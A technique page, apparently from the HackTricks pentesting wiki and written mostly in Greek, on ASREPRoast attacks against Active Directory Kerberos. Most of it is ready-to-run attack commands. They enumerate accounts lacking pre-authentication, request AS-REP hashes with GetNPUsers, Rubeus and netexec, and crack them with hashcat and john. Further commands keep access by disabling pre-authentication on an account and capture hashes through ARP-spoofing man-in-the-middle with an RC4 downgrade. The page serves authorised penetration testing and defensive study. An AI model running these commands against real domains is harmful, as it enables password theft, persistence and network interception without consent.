# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφάλειας που εκμεταλλεύεται χρήστες που δεν διαθέτουν το **Kerberos pre-authentication required attribute**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει σε επιτιθέμενους να ζητήσουν authentication για έναν χρήστη από τον Domain Controller (DC) χωρίς να χρειάζεται το password του χρήστη. Ο DC στη συνέχεια απαντά με ένα μήνυμα κρυπτογραφημένο με το password-derived key του χρήστη, το οποίο οι επιτιθέμεν οι μπορούν να προσπαθήσουν να crack offline για να ανακαλύψουν το password του χρήστη.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Οι στοχευόμενοι χρήστες δεν πρέπει να έχουν αυτή τη λειτουργία ασφαλείας ενεργοποιημένη.
- **Connection to the Domain Controller (DC)**: Οι επιτιθέμενοι χρειάζονται πρόσβαση στον DC για να στείλουν αιτήματα και να λάβουν κρυπτογραφημένα μηνύματα.
- **Optional domain account**: Η ύπαρξη domain account επιτρέπει στους επιτιθέμενους να εντοπίσουν πιο αποδοτικά ευπαθείς χρήστες μέσω LDAP queries. Χωρίς τέτοιο account, οι επιτιθέμενοι πρέπει να μαντέψουν usernames.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Αίτηση μηνύματος AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus θα δημιουργήσει ένα 4768 με encryption type 0x17 και preauth type 0.

#### Σύντομες εντολές (Linux)

- Καταγράψτε πρώτα πιθανούς στόχους (π.χ., από leaked build paths) με Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Αποσπάστε το AS-REP ενός μεμονωμένου χρήστη ακόμη και με **κενό** κωδικό χρησιμοποιώντας `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec επίσης τυπώνει LDAP signing/channel binding posture).
- Crack with `hashcat out.asreproast /path/rockyou.txt` – it auto-detects **-m 18200** (etype 23) for AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Διατήρηση πρόσβασης

Αφαιρέστε την απαίτηση για **preauth** σε έναν χρήστη για τον οποίο έχετε δικαιώματα **GenericAll** (ή δικαιώματα εγγραφής ιδιοτήτων):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast χωρίς διαπιστευτήρια

Ένας attacker μπορεί να χρησιμοποιήσει μια man-in-the-middle θέση για να καταγράψει πακέτα AS-REP καθώς διασχίζουν το δίκτυο, χωρίς να βασίζεται στο ότι το Kerberos pre-authentication είναι απενεργοποιημένο. Συνεπώς λειτουργεί για όλους τους χρήστες στο VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε. Επιπλέον, το εργαλείο αναγκάζει τα client workstations να χρησιμοποιούν RC4 τροποποιώντας τη Kerberos negotiation.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
